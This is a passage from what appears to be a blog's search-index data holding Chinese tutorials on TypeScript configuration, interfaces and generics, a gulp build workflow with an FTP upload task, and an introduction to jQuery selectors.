&quot;noFallthroughCasesInSwitch&quot;: true,    // 报告 switch 语句的 fallthrough 错误。（即，不允许 switch 的 case 语句贯穿）    /* 模块解析选项 */    &quot;moduleResolution&quot;: &quot;node&quot;,            // 选择模块解析策略： &#x27;node&#x27; (Node.js) or &#x27;classic&#x27; (TypeScript pre-1.6)    &quot;baseUrl&quot;: &quot;./&quot;,                       // 用于解析非相对模块名称的基目录    &quot;paths&quot;: &#123;&#125;,                           // 模块名到基于 baseUrl 的路径映射的列表    &quot;rootDirs&quot;: [],                        // 根文件夹列表，其组合内容表示项目运行时的结构内容    &quot;typeRoots&quot;: [],                       // 包含类型声明的文件列表    &quot;types&quot;: [],                           // 需要包含的类型声明文件名列表    &quot;allowSyntheticDefaultImports&quot;: true,  // 允许从没有设置默认导出的模块中默认导入。    /* Source Map Options */    &quot;sourceRoot&quot;: &quot;./&quot;,                    // 指定调试器应该找到 TypeScript 文件而不是源文件的位置    &quot;mapRoot&quot;: &quot;./&quot;,                       // 指定调试器应该找到映射文件而不是生成文件的位置    &quot;inlineSourceMap&quot;: true,               // 生成单个 soucemaps 文件，而不是将 sourcemaps 生成不同的文件    &quot;inlineSources&quot;: true,                 // 将代码与 sourcemaps 生成到一个文件中，要求同时设置了 --inlineSourceMap 或 --sourceMap 属性    /* 其他选项 */    &quot;experimentalDecorators&quot;: true,        // 启用装饰器    &quot;emitDecoratorMetadata&quot;: true          // 为装饰器提供元数据的支持  &#125;&#125;\n\n4.2 TypeScript 编译\n运行 tsc -p ./path-to-project-directory 。tsc -w来启用 TypeScript编译器的观测模式，在检测到文件改动之后，它将重新编译\n\n指定需要编译的文件\n&#123;  &quot;files&quot;: [    &quot;./some/file.ts&quot;  ]&#125;\n\n使用 include 和 exclude 选项来指定需要包含的文件，和排除的文件\n&#123;  &quot;include&quot;: [    &quot;./folder&quot;  ],  &quot;exclude&quot;: [    &quot;./folder/**/*.spec.ts&quot;,    &quot;./folder/someSubFolder&quot;  ]&#125;\n\n五、一些例子演示5.1 定义ajax请求数据接口interface Config&#123;    type:string;    url:string;    data?:string;    dataType:string;&#125;//原生js封装的ajax function ajax(config:Config)&#123;   var xhr=new XMLHttpRequest();   xhr.open(config.type,config.url,true);   xhr.send(config.data);   xhr.onreadystatechange=function()&#123;        if(xhr.readyState==4 &amp;&amp; xhr.status==200)&#123;            console.log(&#x27;chengong&#x27;);            if(config.dataType==&#x27;json&#x27;)&#123;                console.log(JSON.parse(xhr.responseText));            &#125;else&#123;                console.log(xhr.responseText)            &#125;        &#125;   &#125;&#125;ajax(&#123;    type:&#x27;get&#x27;,    data:&#x27;name=zhangsan&#x27;,    url:&#x27;http://a.itying.com/api/productlist&#x27;, //api    dataType:&#x27;json&#x27;&#125;)\n\n5.2 函数类型接口-对方法约束// 函数类型接口:对方法传入的参数 以及返回值进行约束   批量约束// 加密的函数类型接口interface encrypt&#123;    (key:string,value:string):string;&#125;var md5:encrypt=function(key:string,value:string):string&#123;        //模拟操作        return key+value;&#125;console.log(md5(&#x27;name&#x27;,&#x27;zhangsan&#x27;));var sha1:encrypt=function(key:string,value:string):string&#123;    //模拟操作    return key+&#x27;----&#x27;+value;&#125;console.log(sha1(&#x27;name&#x27;,&#x27;lisi&#x27;));\n\n5.3 可索引接口：数组、对象的约束（不常用）5.3.1 可索引接口-对数组的约束interface UserArr&#123;    [index:number]:string&#125;var arr:UserArr=[&#x27;aaa&#x27;,&#x27;bbb&#x27;];console.log(arr[0]);\n\n5.3.2 可索引接口-对对象的约束interface UserObj&#123;    [index:string]:string&#125;var arr:UserObj=&#123;name:&#x27;张三&#x27;&#125;;\n\n5.3.3 类类型接口:对类的约束\n抽象类抽象有点相似\n\ninterface Animal&#123;    name:string;    eat(str:string):void;&#125;class Dog implements Animal&#123;    name:string;    constructor(name:string)&#123;        this.name=name;    &#125;    eat()&#123;        console.log(this.name+&#x27;吃粮食&#x27;)    &#125;&#125;var d=new Dog(&#x27;小黑&#x27;);d.eat();class Cat implements Animal&#123;    name:string;    constructor(name:string)&#123;        this.name=name;    &#125;    eat(food:string)&#123;        console.log(this.name+&#x27;吃&#x27;+food);    &#125;&#125;var c=new Cat(&#x27;小花&#x27;);c.eat(&#x27;老鼠&#x27;);\n\n5.4 接口的扩展\n接口继承接口 类实现接口\n\ninterface Animal&#123;    eat():void;&#125;interface Person extends Animal&#123;    work():void;&#125;class Programmer&#123;    public name:string;    constructor(name:string)&#123;        this.name=name;    &#125;        coding(code:string)&#123;        console.log(this.name+code)    &#125;&#125;class Web extends Programmer implements Person&#123;        constructor(name:string)&#123;       super(name)    &#125;    eat()&#123;        console.log(this.name+&#x27;喜欢吃馒头&#x27;)    &#125;    work()&#123;        console.log(this.name+&#x27;写代码&#x27;);    &#125;    &#125;var w=new Web(&#x27;小李&#x27;);// w.eat();w.coding(&#x27;写ts代码&#x27;);\n\n5.5 泛型类接口5.5.1 泛型类 泛型方法\n泛型：软件工程中，我们不仅要创建一致的定义良好的API，同时也要考虑可重用性。 组件不仅能够支持当前的数据类型，同时也能支持未来的数据类型，这在创建大型系统时为你提供了十分灵活的功能。\n在像C#和Java这样的语言中，可以使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据。 这样用户就可以以自己的数据类型来使用组件。\n通俗理解：泛型就是解决类接口方法的复用性、以及对不特定数据类型的支持(类型校验)\n\n// 只能返回string类型的数据function getData(value:string):string&#123;    return value;&#125;// 同时返回 string类型 和number类型  （代码冗余）function getData1(value:string):string&#123;    return value;&#125;function getData2(value:number):number&#123;    return value;&#125;//同时返回 string类型 和number类型  any可以解决这个问题 function getData(value:any):any&#123;    return &#x27;哈哈哈&#x27;;&#125;getData(123);getData(&#x27;str&#x27;);//any放弃了类型检查,传入什么 返回什么。比如:传入number 类型必须返回number类型  传入 string类型必须返回string类型//传入的参数类型和返回的参数类型可以不一致function getData(value:any):any&#123;  return &#x27;哈哈哈&#x27;;&#125;\n\n\nT表示泛型，具体什么类型是调用这个方法的时候决定的\n\n// T表示泛型，具体什么类型是调用这个方法的时候决定的function getData&lt;T&gt;(value:T):T&#123;   return value;&#125;getData&lt;number&gt;(123);getData&lt;string&gt;(&#x27;1214231&#x27;);getData&lt;number&gt;(&#x27;2112&#x27;);       /*错误的写法*/function getData&lt;T&gt;(value:T):any&#123;   return &#x27;2145214214&#x27;;&#125;getData&lt;number&gt;(123);  //参数必须是numbergetData&lt;string&gt;(&#x27;这是一个泛型&#x27;);\n\n泛型类\n\n泛型类：比如有个最小堆算法，需要同时支持返回数字和字符串 a - z两种类型。 通过类的泛型来实现\n\n// 基本写法 但是不能传入字符串class MinClass&#123;    public list:number[]=[];    add(num:number)&#123;        this.list.push(num)    &#125;    min():number&#123;        var minNum=this.list[0];        for(var i=0;i&lt;this.list.length;i++)&#123;            if(minNum&gt;this.list[i])&#123;                minNum=this.list[i];            &#125;        &#125;        return minNum;    &#125;&#125;var m=new MinClass();m.add(3);m.add(22);m.add(23);m.add(6);m.add(7);alert(m.min());\n\n类的泛型\n// 通过泛型改写 可以同时传入number 字符串等//类的泛型class MinClas&lt;T&gt;&#123;    public list:T[]=[];    add(value:T):void&#123;        this.list.push(value);    &#125;    min():T&#123;                var minNum=this.list[0];        for(var i=0;i&lt;this.list.length;i++)&#123;            if(minNum&gt;this.list[i])&#123;                minNum=this.list[i];            &#125;        &#125;        return minNum;    &#125;&#125;var m1=new MinClas&lt;number&gt;();   /*实例化类 并且制定了类的T代表的类型是number*/m1.add(11);m1.add(3);m1.add(2);alert(m1.min())var m2=new MinClas&lt;string&gt;();   /*实例化类 并且制定了类的T代表的类型是string*/m2.add(&#x27;c&#x27;);m2.add(&#x27;a&#x27;);m2.add(&#x27;v&#x27;);alert(m2.min())\n\n5.5.2 泛型接口1. 方式1\ninterface ConfigFn&#123;    &lt;T&gt;(value:T):T;&#125;var getData:ConfigFn=function&lt;T&gt;(value:T):T&#123;    return value;&#125;getData&lt;string&gt;(&#x27;张三&#x27;);// getData&lt;string&gt;(1243);  //错误\n\n2. 方式2\ninterface ConfigFn&lt;T&gt;&#123;    (value:T):T;&#125;function getData&lt;T&gt;(value:T):T&#123;    return value;&#125;var myGetData:ConfigFn&lt;string&gt;=getData;     myGetData(&#x27;20&#x27;);  /*正确*/// myGetData(20)  //错误\n","categories":["前端"],"tags":["typescript"]},{"title":"glup工作流","url":"/2020/09/02/webpack/glup%E5%B7%A5%E4%BD%9C%E6%B5%81/","content":"\n配置一套基于gulp的工作流，满足日常的基本开发。\n\n一、目录结构\n二、 package.json&#123;  &quot;name&quot;: &quot;gulp-project&quot;,  &quot;scripts&quot;: &#123;    &quot;dev&quot;: &quot;gulp dev&quot;, //npm run dev   开发    &quot;build&quot;: &quot;gulp build&quot;, //npm run build   发布    &quot;upload&quot;: &quot;gulp upload&quot;, //npm run upload 上传服务器     &quot;zip&quot;: &quot;gulp zip&quot; ////npm run zip 打包文件  &#125;,  &quot;devDependencies&quot;: &#123;    &quot;babel-preset-es2015&quot;: &quot;^6.22.0&quot;, //编译es6    &quot;browser-sync&quot;: &quot;^2.15.0&quot;,  //监听改动刷新    &quot;gulp&quot;: &quot;^3.9.1&quot;, //gulp    &quot;gulp-autoprefixer&quot;: &quot;^3.1.1&quot;, //补齐css浏览器前缀    &quot;gulp-babel&quot;: &quot;^6.1.2&quot;, // Es6    &quot;gulp-clean&quot;: &quot;^0.3.2&quot;, //删除文件    &quot;gulp-clean-css&quot;: &quot;^2.0.12&quot;, //css压缩，gulp-minify-css不更新了    &quot;gulp-concat&quot;: &quot;^2.6.0&quot;,//合并文件    &quot;gulp-ftp&quot;: &quot;^1.1.0&quot;,//提交到ftp服务器    &quot;gulp-git&quot;: &quot;^1.11.3&quot;,//提交到git    &quot;gulp-htmlmin&quot;: &quot;^2.0.0&quot;,//压缩html    &quot;gulp-imagemin&quot;: &quot;^3.0.3&quot;,//压缩图片    &quot;gulp-rename&quot;: &quot;^1.2.2&quot;,//重命名文件    &quot;gulp-rev-append&quot;: &quot;^0.1.6&quot;, //添加MD5版本号，这里改成了时间戳    &quot;gulp-sass&quot;: &quot;^2.3.2&quot;,//编译SASS    &quot;gulp-uglify&quot;: &quot;^2.0.0&quot;,//js压缩    &quot;gulp-util&quot;: &quot;^3.0.7&quot;, //说是ftp配套用的，看了下是包装了些常用函数    &quot;gulp-zip&quot;: &quot;^3.2.0&quot; // 打包文件  &#125;&#125;\n\n三、 gulpfile.js//组件let gulp = require(&#x27;gulp&#x27;),\tbrowserSync = require(&#x27;browser-sync&#x27;).create(), //监听刷新    reload = browserSync.reload,    ftp = require(&#x27;gulp-ftp&#x27;), // ftp上传    gutil = require(&#x27;gulp-util&#x27;),    sass = require(&#x27;gulp-sass&#x27;), // sass    cleancss = require(&#x27;gulp-clean-css&#x27;), // CSS压缩    autoprefixer = require(&quot;gulp-autoprefixer&quot;),    uglify = require(&#x27;gulp-uglify&#x27;), // js压缩    concat = require(&#x27;gulp-concat&#x27;), // 合并文件    rename = require(&#x27;gulp-rename&#x27;), // 重命名    clean = require(&#x27;gulp-clean&#x27;), //清空文件夹    imagemin = require(&#x27;gulp-imagemin&#x27;), //压缩图片    zip = require(&#x27;gulp-zip&#x27;), //打包文件    rev = require(&#x27;gulp-rev-append&#x27;), //添加MD5    htmlmin = require(&#x27;gulp-htmlmin&#x27;), // 压缩html\tgit = require(&#x27;gulp-git&#x27;),     //git\tbabel = require(&quot;gulp-babel&quot;); //ES6 转es5// =========== 开发构建流程 [多文件输出] ==============//devgulp.task(&#x27;sass:dev&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/sass/*.scss&#x27;)        .pipe(sass())        .pipe(gulp.dest(&#x27;src/css/&#x27;))        .pipe(reload(&#123; stream: true &#125;))&#125;);// 合并、重命名cssgulp.task(&#x27;css:dev&#x27;, [&#x27;sass:dev&#x27;], () =&gt; &#123;    gulp.src([&#x27;src/css/*.css&#x27;, &#x27;!src/css/areaMap.css&#x27;])        .pipe(concat(&#x27;all.css&#x27;))        .pipe(gulp.dest(&#x27;dist/css/&#x27;))&#125;);// 合并、重命名jsgulp.task(&#x27;js:dev&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/js/*.js&#x27;)    \t.pipe(babel(&#123;\t\t      \t \tpresets: [&#x27;es2015&#x27;]     \t\t\t&#125;)) //ES6转ES5        //.pipe(concat(&#x27;all.js&#x27;)) 开发阶段分开输出js文件        .pipe(gulp.dest(&#x27;dist/js/&#x27;))        .pipe(reload(&#123; stream: true &#125;))&#125;);// HTMLgulp.task(&#x27;html:dev&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/tpl/*.html&#x27;)        .pipe(gulp.dest(&#x27;dist&#x27;))&#125;);// 将lib的库文件对应到指定位置gulp.task(&#x27;lib:dev&#x27;, () =&gt; &#123;    gulp.src(&#x27;./src/lib/*&#x27;)        .pipe(gulp.dest(&#x27;./dist/lib/&#x27;));&#125;);//开发构建gulp.task(&#x27;dev&#x27;, [&#x27;css:dev&#x27;, &#x27;js:dev&#x27;, &#x27;html:dev&#x27;, &#x27;img&#x27;,&#x27;copyFonts&#x27;,&#x27;lib&#x27;], () =&gt; &#123;    browserSync.init(&#123;        server: &#123;            baseDir: &quot;dist&quot; // 设置服务器的根目录为dist目录        &#125;,        notify: false // 开启静默模式    &#125;);    // 我们使用gulp的文件监听功能，来实时编译修改过后的文件    gulp.watch(&#x27;src/js/*.js&#x27;, [&#x27;js:dev&#x27;]);    gulp.watch(&#x27;src/sass/*.scss&#x27;, [&#x27;sass:dev&#x27;]);    gulp.watch(&#x27;src/tpl/*.html&#x27;, [&#x27;html:dev&#x27;]);    gulp.watch(&#x27;src/fonts/**&#x27;, [&#x27;copyFonts&#x27;]);    gulp.watch(&#x27;src/images/**&#x27;, [&#x27;img&#x27;]);    gulp.watch(&#x27;src/lib/**&#x27;, [&#x27;lib&#x27;]);&#125;);// =========== 正式构建 build [单文件输出] ==============// sass解析gulp.task(&#x27;sass&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/sass/*.scss&#x27;)        //输出为压缩         .pipe(sass(&#123;             outputStyle: &#x27;compressed&#x27;         &#125;))        .pipe(sass())        .pipe(gulp.dest(&#x27;src/css/&#x27;))&#125;);// 合并、压缩、重命名cssgulp.task(&#x27;css&#x27;, [&#x27;sass&#x27;], () =&gt; &#123;    gulp.src([&#x27;src/css/*.css&#x27;, &#x27;!src/css/areaMap.css&#x27;])        .pipe(concat(&#x27;all.css&#x27;))        .pipe(autoprefixer(&#123;            browsers: [&#x27;last 2 versions&#x27;, &#x27;Android &gt;= 4.0&#x27;],            cascade: true, //是否美化属性值 默认：true 像这样：            remove: false //是否去掉不必要的前缀 默认：true         &#125;))        .pipe(cleancss()) //压缩css        .pipe(gulp.dest(&#x27;dist/css&#x27;));&#125;);// 合并，压缩,重命名js文件gulp.task(&#x27;js&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/js/*.js&#x27;)    \t.pipe(babel(&#123;\t\t      \t \tpresets: [&#x27;es2015&#x27;]     \t\t\t&#125;)) //ES6转ES5        .pipe(concat(&#x27;all.js&#x27;))        .pipe(uglify())        .pipe(gulp.dest(&#x27;dist/js&#x27;));&#125;);// 压缩HTMLgulp.task(&#x27;html&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/tpl/*.html&#x27;)        .pipe(rev())//记得在引用地址后面加后缀，插件原本是ver=@@hash ,这里改成了v=@@hash      //&lt;link rel=&quot;stylesheet&quot; href=&quot;css/all.css?v=@@hash&quot;&gt;      //&lt;script src=&quot;js/all.js?v=@@hash&quot;&gt;&lt;/script&gt;        .pipe(htmlmin(&#123;            removeComments: true, //清除HTML注释            collapseWhitespace: true, //压缩HTML            collapseBooleanAttributes: true, //省略布尔属性的值 &lt;input checked=&quot;true&quot;/&gt; ==&gt; &lt;input /&gt;            removeEmptyAttributes: true, //删除所有空格作属性值 &lt;input id=&quot;&quot; /&gt; ==&gt; &lt;input /&gt;            removeScriptTypeAttributes: true, //删除&lt;script&gt;的type=&quot;text/javascript&quot;            removeStyleLinkTypeAttributes: true, //删除&lt;style&gt;和&lt;link&gt;的type=&quot;text/css&quot;            minifyJS: true, //压缩页面JS            minifyCSS: true //压缩页面CSS        &#125;))        .pipe(gulp.dest(&#x27;dist&#x27;))&#125;);//压缩图片gulp.task(&#x27;img&#x27;, () =&gt; &#123;    gulp.src(&#x27;src/images/*.&#123;png,jpg,gif,ico&#125;&#x27;)        .pipe(imagemin(&#123;            optimizationLevel: 5, //类型：Number  默认：3  取值范围：0-7（优化等级）            progressive: true, //类型：Boolean 默认：false 无损压缩jpg图片            interlaced: true, //类型：Boolean 默认：false 隔行扫描gif进行渲染            multipass: true //类型：Boolean 默认：false 多次优化svg直到完全优化        &#125;))        .pipe(gulp.dest(&#x27;dist/images&#x27;));&#125;);//字体文件gulp.task(&#x27;copyFonts&#x27;, function () &#123;    gulp.src(&#x27;src/fonts/**/*&#x27;)        .pipe(gulp.dest(&#x27;dist/fonts/&#x27;))&#125;);// 清空图片、样式、jsgulp.task(&#x27;clean&#x27;, () =&gt; &#123;    gulp.src(&#x27;dist&#x27;, &#123; read: false &#125;)        .pipe(clean(&#123; force: true &#125;));&#125;);// 将bower的库文件对应到指定位置gulp.task(&#x27;lib&#x27;, () =&gt; &#123;    gulp.src(&#x27;/src/lib/*&#x27;)        .pipe(gulp.dest(&#x27;/dist/lib/&#x27;));&#125;);// ================ 打包主体dist 文件夹 zip ====//打包主体dist 文件夹并按照时间重命名gulp.task(&#x27;zip&#x27;, function()&#123;      function checkTime(i) &#123;          if (i &lt; 10) &#123;              i = &quot;0&quot; + i          &#125;          return i      &#125;                var d=new Date();      var year=d.getFullYear();      var month=checkTime(d.getMonth() + 1);      var day=checkTime(d.getDate());      var hour=checkTime(d.getHours());      var minute=checkTime(d.getMinutes());  return gulp.src(&#x27;./dist/**&#x27;)        .pipe(zip(year+month+day +hour+minute+&#x27;.zip&#x27;))        .pipe(gulp.dest(&#x27;./zip&#x27;));&#125;);//正式构建gulp.task(&#x27;build&#x27;, [&#x27;clean&#x27;,&#x27;css&#x27;, &#x27;js&#x27;, &#x27;img&#x27;, &#x27;html&#x27;,&#x27;copyFonts&#x27;,&#x27;lib&#x27;]);// ================ 上传 upload ====gulp.task(&#x27;upload&#x27;, () =&gt; &#123;    gulp.src(&#x27;dist/**&#x27;)        .pipe(ftp(&#123;            host: &#x27;8.8.8.8&#x27;, // 远程主机ip            port: 22, // 端口            user: &#x27;username&#x27;, // 帐号            pass: &#x27;password&#x27;, // 密码            remotePath: &#x27;/project&#x27; // 上传路径，不存在则新建        &#125;))        .pipe(gutil.noop())&#125;)","categories":["前端工程化"],"tags":["glup"]},{"title":"jQurty总结","url":"/2021/03/12/html+css+js+ts/jQuery%E6%80%BB%E7%BB%93/","content":"第一节 jQuery初步认知\njQuery概述\n\nJQuery概念\n\n&#96;&#96;&#96;javascript\n  概念  - 基于`Js`语言的`API`和语法组织逻辑，通过内置`window`和`document`对象，来操作内存中的`DOM`元素- ```  JQuery\n\n概念\n\n基于javascript的，同上，提高了代码的效率\n\n\n\n\njQuery是什么:\n\n是一个javascript代码仓库，我们称之为javascript框架。\n是一个快速的简洁的javascript框架，可以简化查询DOM对象、处理事件、制作动画、处理Ajax交互过程。\n它可以帮我们做什么(有什么优势)\n轻量级、体积小，使用灵巧(只需引入一个js文件)\n强大的选择器\n出色的DOM操作的封装\n出色的浏览器兼容性\n可靠的事件处理机制\n完善的Ajax\n链式操作、隐式迭代\n方便的选择页面元素(模仿CSS选择器更精确、灵活)\n动态更改页面样式&#x2F;页面内容(操作DOM，动态添加、移除样式)\n控制响应事件(动态添加响应事件)\n提供基本网页特效(提供已封装的网页特效方法)\n快速实现通信(ajax)\n易扩展、插件丰富\n\n\n\n\n如何引入JQuery包\n\n引入本地的JQuery\n引入Google在线提供的库文件（稳定可靠高速）\n使用Google提供的API导入 &#96;&#96;\n写第一个JQUery案例\n解释:在JQuery库中，$是JQuery的别名，$()等效于就jQuery()\n\n\n\n&lt;script type=“text/javascript” src=“”&gt;&lt;/script&gt;&lt;script type=“text/javascript”&gt;\t$(function()&#123;\t\talert(“jQuery 你好!”);\t&#125;);&lt;/script&gt;\n\n讲解$(function()&#123;&#125;);\n\n$是jQuery别名。如$()也可jQuery()这样写,相当于页面初始化函数，当页面加载完毕，会执行jQuery()。\n\n希望在做所有事情之前，JQuery操作DOM文档。必须确保在DOM载入完毕后开始执行，应该用ready事件做处理HTML文档的开始\n\n$(document).ready(function()&#123;&#125;)\n    ;    - 类似于`js`的`window.onload`事件函数，但是`ready`事件要先于`onload`事件执行    - `window.onload = function()&#123;&#125;`;  - 为方便开发，`jQuery`简化这样的方法，直接用`$()`表示  - `JQuery`的`ready`事件不等于`Js`的`load`：    - 执行时机不同：`load`需要等外部图片和视频等全部加载才执行。`ready`是`DOM`绘制完毕后执行，先与外部文件    - 用法不同：`load`只可写一次，`ready`可以多次- **`window.onload`与`$(document).ready()`对比**|          | window.onload                            | $(document).ready()                                          || :------- | :--------------------------------------- | :----------------------------------------------------------- || 执行时机 | 必须等网页中所有内容加载完后(图片)才执行 | 网页中的`DOM`结构绘制完后就执行,可能`DOM`元素相关的东西并没有加载完 || 编写个数 | 不能同时执行多个                         | 能同时执行多个                                               || 简化写法 | 无                                       | `$(document).ready(function()&#123; //.. &#125;);`  推荐写法：`$(function()&#123; &#125;);` |- **`jQuery`有哪些功能(`API`)**：  - 选择器  - 过滤器  - 事件  - 效果  - `ajax`- **简单的`JQuery`选择器**：  - `JQuery`基本选择器（`ID`选择器，标签选择器，类选择器，通配选择器和组选择器`5`种）  - `ID`选择器：`document.getElementById(id)`与`$(&quot;#id&quot;)`对比(改变文字大小)—`id`唯一，返回单个元素  - 标签选择器：`document.getElementsByTagName(tagName)`与`$(&quot;tagname&quot;)`对比—多个标签，返回数组  - 类选择器:`$(&quot;.className&quot;)`–多个`classname`（改变背景图片）  - 通配选择器：`document.getElementsByTagName(&quot;*&quot;)`与`$(&quot;*&quot;)`对比—指范围内的所有标签元素  - 组选择器：`$(&quot;seletor1,seletor2,seletor3&quot;)`—-无数量限制，用逗号分割##### 初步了解`JQuery`------- `JQuery`是什么  - ```    javascript\n\n用来干什么的：\n\n- 操作`DOM`对象\n- 动态操作样式`css`\n- 数据访问\n- 控制响应事件等\n\n\njQuery作用一样，只是更加快速简洁\n\n\n\n如何引用JQuery\n&lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt;写第一个JQUery案例&lt;script type=“text/javascript” src=“”&gt;&lt;/script&gt;&lt;script type=“text/javascript”&gt;\t$(function()&#123;\t\talert(“jQuery 你好!”);\t&#125;);&lt;/script&gt;\n\n$()讲解\n\n$在JQuery库中，$是JQuery的别名，$()等效于就jQuery().\n$()是JQuery方法,赞可看作是JQuery的选择器，与css选择器相似（可做对比）\nvar jQuery==$ =function()&#123;&#125; $()本质就是一个函数也就是 jQuery的核心函数\n只要是jQuery的对象都这样变量加上一个符号$方便识别：var $div = $(&quot;#&quot;)\n\n\n\nfunction　$(id)&#123;\t\treturn document.getElementById(id);\t&#125;\n\n\n$()和document是相等的吗\n\n&lt;div id=&quot;a&quot; class=&quot;aa&quot;&gt;&lt;/div&gt;&lt;div id=&quot;b&quot; class=&quot;aa&quot;&gt;&lt;/div&gt;&lt;div id=&quot;c&quot; class=&quot;aa&quot;&gt;&lt;/div&gt;alert(document.getElementById(&quot;id&quot;) == $(&quot;#aa&quot;));//返回结果为falsealert(document.getElementById(&quot;id&quot;) == $(&quot;#aa&quot;).get(0));//返回true\n\n\n代理对象$()\n\njQuery中返回的是代理对象本身\n\njQuery的核心原理是通过选择器找到对应的代理对象\n\njQuery全都是通过方法操作\n\n样式选择器\n$(&quot;.className&quot;)\n\n\n$(&quot;.aa&quot;).css(&quot;color&quot;,&quot;green&quot;);\n\n\nid选择器(“”)\n\n$(&quot;#a&quot;).css(&quot;background-color&quot;,&quot;#ff0066&quot;);\n\n\n标签选择器\n\n$(&quot;p&quot;).css(&quot;color&quot;,&quot;#cc3366&quot;);\n\n\n组选择器\n\n$(&quot;#b ul li&quot;).size();\n\n\n\n\n对象转换($(element))\n\n原生dom对象和jquery代理对象的相互转换\n\n\n\n$(传入的原生对象);//原生对象转化成jQuery对象var nav = document.getElementById(&quot;nav&quot;);var $nav = $(nav);alert($nav.get(0) == nav);//true\n\n\n检索范围的限制（$(&#39;字符串&#39;,element)）\n\n总结：三种写法对比：\n方式一：不推荐 搜索速度最慢\n$(&quot;#nav&quot;).css();\n$(&quot;#nav li&quot;).css();\n\n\n方式二：搜索速度最快 链式操作\n$(&quot;#nav&quot;).css().children().css();\n\n\n方式三：也常用 速度第二快\nvar $nav = $(&quot;#nav&quot;).css();\n$(&quot;li&quot;,$nav).css(); $nav限制了搜索范围 速度快\n\n\n\n\n\n\n总结： $() jquery核心方法的作用和使用场景\n\n如果是一个字符串参数并且没有标签对（选择器）$(ul.nav&quot;)\n如果是一个字符串参数并且有标签对（创建html标签）$(&quot;&quot;) –最终加到DOM树中 $xx.append(&quot;&quot;);\n如果是传入一个element dom对象，直接包装为proxy对象返回 $(DOM对象)\n如果第一个参数是字符串，第二个是element dom对象的话，那么就是在element这个dom对象里面寻找选择器对应的元素并且代理 $(&quot;li&quot;,$DOM对象)\n\n\n代理模式以及代理内存结构\n\n\n\n\n第二节 选择器\n\n来回顾一下CSS常用的选择器\n\n\n\n\n选择器\n语法\n描述\n\n\n\n标签选择器\nE&#123;css规则&#125;\n以文档元素作为选择符\n\n\nID选择器\n#ID&#123;css规则&#125;\nID作为选择符\n\n\n类选择器\nE.className&#123;css规则&#125;\nclass作为选择符\n\n\n群组选择器\nE1,E2,E3&#123;css规则&#125;\n多个选择符应用同样的样式\n\n\n后代选择器\nE F&#123;css规则&#125;\n元素E的任意后代元素F\n\n\n\n选择器引擎规则($(&#39;字符串&#39;))\n\n&#96;&#96;&#96;css    选择器的规则    - 标签选择器    - `id`选择器    - 类选择器    - 混合选择器  - `css3`的选择器规则  - 状态和伪类（`:even` `:odd` `:first` `:last` `:eq(index)`）  - 属性（`[attr=value]`）- 层级选择器:通过`DOM`的嵌套关系匹配元素  - `jQuery`层级选择器—-包含选择器、子选择器、相邻选择器、兄弟选择器4种  - a.包含选择器：`$(&quot;a b&quot;)`在给定的祖先元素下匹配所有后代元素。(不受层级限制)  - b.子选择器：`$(&quot;parent &gt; child&quot;)`在给定的父元素下匹配所有子元素。  - c.相邻选择器：`$(&quot;prev + next&quot;)` 匹配所有紧接在`prev`元素后的`next`元素。  - d.兄弟选择器：`$(&quot;prev ~ siblings&quot;)` 匹配prev元素之后的所有`sibling`元素。##### 过滤选择器------- **基本过滤选择**| 选择器       | 说明                           | 返回     || :----------- | :----------------------------- | :------- || `:first`     | 匹配找到的第1个元素            | 单个元素 || `:last`      | 匹配找到的最后一个元素         | 单个元素 || `:eq`        | 匹配一个给定索引值的元素       | 单个元素 || `:even`      | 匹配所有索引值为偶数的元素     | 集合元素 || `: odd`      | 匹配所有索引值为奇数的元素     | 集合元素 || `:gt(index)` | 匹配所有大于给定索引值的元素   | 集合元素 || `:lt(index)` | 匹配所有小于给定索引值的元素   | 集合元素 || `:not`       | 去除所有与给定选择器匹配的元素 | 集合元素 || `:animated`  | 选取当前正在执行动画的所有元素 | 集合元素 || `focus`      | 选取当前正在获取焦点的元素     | 集合元素 |- **内容过滤选择器**| 选择器            | 描述                             | 返回     || :---------------- | :------------------------------- | :------- || `:contains(text)` | 选取含有文本内容为text的元素     | 集合元素 || `:empty`          | 选取不包含子元素获取文本的空元素 | 集合元素 || `:has(selector)`  | 选择含有选择器所匹配的元素的元素 | 集合元素 || `:parent`         | 选取含有子元素或者文本的元素     | 集合元素 |- **可见过滤选择器**| 选择器     | 描述                 | 返回     || :--------- | :------------------- | :------- || `:hidden`  | 选择所有不可见的元素 | 集合元素 || `:visible` | 选取所有可见的元素   | 集合元素 |- **属性过滤选择器**| 选择器              | 说明                            | 返回     || :------------------ | :------------------------------ | :------- || `[attribute]`       | 选取拥有此属性的元素            | 集合元素 || `[attribute=value]` | 选取属性值为`value`值的元素     | 集合元素 || `[attribue^=value]` | 选取属性的值以`value`开始的元素 | 集合元素 || `[attribue$=value]` | 选取属性的值以`value`结束的元素 | 集合元素 |- **子元素过滤选择器**| 选择器                       | 说明                                                         | 返回     || :--------------------------- | :----------------------------------------------------------- | :------- || `:nth-child(index/even/odd)` | 选取每个父元素下的第index个子元素或者奇偶元素（`index`从`1`算起） | 集合元素 || `:first-child`               | 选取每个元素的第一个子元素                                   | 集合元素 || `:last-child`                | 选取每个元素的最后一个子元素                                 | 集合元素 |- `:nth-child()`选择器是很常用的子元素过滤选择器，如下  - `:nth-child(even)`选择每个父元素下的索引值是偶数的元素  - `:nth-child(odd)`选择每个父元素下的索引值是奇数的元素  - `:nth-child(2)`选择每个父元素下的索引值是`2`的元素  - `:nth-child(3n)`选择每个父元素下的索引值是3的倍数的元素 (`n`从`1`开始)- **表单对象属性过滤选择器**| 选择器      | 说明                                   | 返回     || :---------- | :------------------------------------- | :------- || `:enabled`  | 选取所有可用元素                       | 集合元素 || `:disabled` | 选取所有不可用元素                     | 集合元素 || `:checked`  | 选取所有被选中的元素（单选框、复选框） | 集合元素 || `:selected` | 选取所有被选中的元素（下拉列表）       | 集合元素 |- **表单选择器**| 选择器      | 说明                                             || :---------- | :----------------------------------------------- || `:input`    | 选取所有`input` `textarea` `select` `button`元素 || `:text`     | 选取所有单行文本框                               || `:password` | 选取所有密码框                                   || `:radio`    | 选取所有单选框                                   || `:checkbox` | 选取所有多选框                                   || `:submit`   | 选取所有的提交按钮                               || `:image`    | 选取所有的图像按钮                               || `:reset`    | 